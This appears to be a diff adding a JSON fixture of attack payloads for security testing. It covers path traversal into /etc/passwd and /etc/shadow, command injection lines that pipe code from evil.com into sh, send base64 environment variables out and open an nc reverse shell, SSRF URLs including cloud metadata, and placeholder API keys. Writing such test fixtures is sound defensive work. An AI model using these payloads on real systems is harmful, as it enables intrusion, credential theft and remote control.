@@ -1,0 +1,40 @@
+[
+  {
+    "type": "path_traversal",
+    "payloads": [
+      "../../../etc/passwd",
+      "..\\..\\..\\Windows\\System32",
+      "/workspace/../.env",
+      "/%2e%2e/%2e%2e/etc/shadow"
+    ]
+  },
+  {
+    "type": "command_injection",
+    "payloads": [
+      "; cat /etc/passwd",
+      "| wget http://evil.com/malware -O- | sh",
+      "`curl http://evil.com/exfil?data=$(env | base64)`",
+      "$(nc -e /bin/sh 10.0.0.1 4444)",
+      "& ping -c 10 127.0.0.1 &"
+    ]
+  },
+  {
+    "type": "ssrf",
+    "payloads": [
+      "http://169.254.169.254/latest/meta-data/",
+      "http://127.0.0.1:22",
+      "http://[::1]:80",
+      "http://0x7f000001/",
+      "http://localhost.evil.com",
+      "http://10.0.0.5/admin"
+    ]
+  },
+  {
+    "type": "data_exfiltration",
+    "payloads": [
+      "AKIAIOSFODNN7EXAMPLE",
+      "sk-ant-api03-abcdef1234567890abcdef1234567890abcdef1234567890",
+      "ghp_abcdefghijklmnopqrstuvwxyz1234567890"
+    ]
+  }
+]
